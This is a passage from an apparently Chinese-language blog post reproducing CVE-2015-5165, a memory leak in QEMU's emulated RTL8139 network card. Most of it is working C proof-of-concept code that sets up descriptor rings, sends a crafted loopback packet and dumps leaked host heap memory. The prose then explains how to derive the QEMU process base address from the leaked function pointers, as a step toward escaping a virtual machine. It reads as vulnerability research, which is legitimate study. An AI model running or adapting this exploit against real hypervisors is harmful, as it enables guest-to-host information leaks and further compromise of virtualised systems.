</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 Rx/Tx descriptor
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>rtl8139_desc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>dw1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_lo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>buf_hi</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>rtl8139_desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 Rx/Tx ring
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>rtl8139_ring</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>rtl8139_ring</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>gva_to_gpa</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/proc/self/pagemap&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>pme</span><span class=p>,</span> <span class=n>gfn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>9</span><span class=p>)</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pme</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PAGE_PRESENT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>gfn</span> <span class=o>=</span> <span class=n>pme</span> <span class=o>&amp;</span> <span class=n>PAGE_PFN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>gfn</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>PAGE_SHIFT</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writeb</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outb</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writew</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outw</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pmio_writel</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>data</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outl</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readb</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inb</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readw</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inw</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_readl</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inl</span><span class=p>(</span><span class=n>PMIO_BASE</span><span class=o>+</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_desc_config_rx</span><span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>ring</span><span class=p>,</span> <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>buffer_size</span> <span class=o>=</span> <span class=n>RTL8139_BUFFER_SIZE</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>nb</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>desc</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>buffer_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nf>memset</span><span class=p>(</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>buffer_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>CP_RX_OWN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>buffer_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>desc</span><span class=o>-&gt;</span><span class=n>buf_lo</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// printf(&#34;buffer[%d]: 0x%x\n&#34;, i, ring[i].desc-&gt;buf_lo);  // for debug
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>((</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>desc</span><span class=p>),</span> <span class=n>RxRingAddrLO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>RxRingAddrHI</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_desc_config_tx</span><span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>desc</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>desc</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>CP_TX_OWN</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_EOR</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_LS</span>   <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_IPCS</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_TCPCS</span><span class=o>|</span>
</span></span><span class=line><span class=cl>                 <span class=n>CP_TX_LGSEN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>dw0</span> <span class=o>|=</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>desc</span><span class=o>-&gt;</span><span class=n>buf_lo</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>((</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>gva_to_gpa</span><span class=p>(</span><span class=n>desc</span><span class=p>),</span> <span class=n>TxAddr0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>TxAddr0</span><span class=o>+</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_card_config</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=n>TxLoopBack</span><span class=p>,</span> <span class=n>TxConfig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writel</span><span class=p>(</span><span class=n>AcceptMyPhys</span><span class=p>,</span> <span class=n>RxConfig</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writew</span><span class=p>(</span><span class=n>CPlusRxEnb</span><span class=o>|</span><span class=n>CPlusTxEnb</span><span class=p>,</span> <span class=n>CpCmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_writeb</span><span class=p>(</span><span class=n>CmdRxEnb</span><span class=o>|</span><span class=n>CmdTxEnb</span><span class=p>,</span> <span class=n>ChipCmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rtl8139_packet_send</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>packet</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>len</span> <span class=o>&lt;=</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>packet</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>pmio_writeb</span><span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>6</span><span class=p>,</span> <span class=n>TxPoll</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xxd</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ptr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>,</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=mi>16</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>0x%08x: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)(</span><span class=n>ptr</span><span class=o>+</span><span class=n>i</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%02x &#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=mi>7</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 44*1500 = 66000 &gt; ip_data_len = 65535
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>size_t</span> <span class=n>rtl8139_rx_nb</span> <span class=o>=</span> <span class=mi>44</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_ring</span> <span class=o>*</span><span class=n>rtl8139_rx_ring</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_desc</span> <span class=o>*</span><span class=n>rtl8139_rx_desc</span><span class=p>,</span> <span class=o>*</span><span class=n>rtl8139_tx_desc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_rx_ring</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_ring</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_ring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_rx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rtl8139_tx_desc</span> <span class=o>=</span> <span class=p>(</span><span class=n>rtl8139_desc</span> <span class=o>*</span><span class=p>)</span><span class=nf>aligned_alloc</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rtl8139_desc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>rtl8139_tx_buffer</span> <span class=o>=</span> <span class=nf>aligned_alloc</span><span class=p>(</span><span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_desc_config_rx</span><span class=p>(</span><span class=n>rtl8139_rx_ring</span><span class=p>,</span> <span class=n>rtl8139_rx_desc</span><span class=p>,</span> <span class=n>rtl8139_rx_nb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_desc_config_tx</span><span class=p>(</span><span class=n>rtl8139_tx_desc</span><span class=p>,</span> <span class=n>rtl8139_tx_buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_card_config</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>rtl8139_packet_send</span><span class=p>(</span><span class=n>rtl8139_tx_buffer</span><span class=p>,</span> <span class=n>packet</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>packet</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>sleep</span><span class=p>(</span><span class=mi>7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>rtl8139_rx_nb</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// for (int i = 0; i &lt; 2; ++i) {
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>xxd</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>rtl8139_rx_ring</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>buffer</span><span class=p>,</span> <span class=n>RTL8139_BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p>原文章[2]中通过这个漏洞获得了<code>qemu-system-x86_64</code>进程加载的基址，和为客户机所MMAP的内存基址。在我的复现环境中未能得到虚拟机内存的基址。下面说一下获得text基址的方法和我所做的一些尝试。</p><p>文章[2]在泄露的信息中搜索保存了<code>ObjectProperty</code>对象的堆块（可能是被释放的堆块），通过读取<code>ObjectProperty</code>中所保存的函数指针来泄露<code>qemu-system-x86_64</code>的基地址。</p><p>泄露的数据如下图：</p><p><img alt=image-20201205161404250 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20201205161404250.png></p><p>此时进程<code>vmmap</code>如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    0x555555554000     0x5555555f2000 r--p    9e000 0      qemu-system-x86_64
</span></span><span class=line><span class=cl>    0x5555555f2000     0x5555559c9000 r-xp   3d7000 9e000  qemu-system-x86_64
</span></span><span class=line><span class=cl>    0x5555559c9000     0x555555b15000 r--p   14c000 475000 qemu-system-x86_64
</span></span><span class=line><span class=cl>    0x555555b15000     0x555555be0000 r--p    cb000 5c0000 qemu-system-x86_64
</span></span><span class=line><span class=cl>    0x555555be0000     0x555555c5e000 rw-p    7e000 68b000 qemu-system-x86_64
</span></span><span class=line><span class=cl>    0x555555c5e000     0x5555586bc000 rw-p  2a5e000 0      [heap]
</span></span><span class=line><span class=cl>    # .......    
</span></span><span class=line><span class=cl>    0x7fff93600000     0x7fffd3600000 rw-p 40000000 0    # MMAPED Memory: 1G
</span></span><span class=line><span class=cl>    # .......
</span></span></code></pre></td></tr></table></div></div><p>我是在泄露的信息中寻找形似函数指针的数据进行验证（在泄露的数据之中搜索<code>55 55 55</code>），验证是否为某函数（其实看函数名字，也就是<code>ObjectProperty</code>中的成员）。</p><p><img alt=qemuleak loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/qemuleak.png></p><p>然后使用任意函数低12位地址进行匹配，减去其偏移得到基地址。</p><p>至于客户机内存基地址，在泄露的数据搜索<code>ff 7f</code>，没注意到与<code>0x7fff93600000 0x7fffd3600000 rw-p 40000000 0</code>有强烈关联的地址。而且在我这里，所分配的1G地址空间，低20位为0；网上exploit都是低24位为0的。</p><p><a href=https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/exp.c>exp.c</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
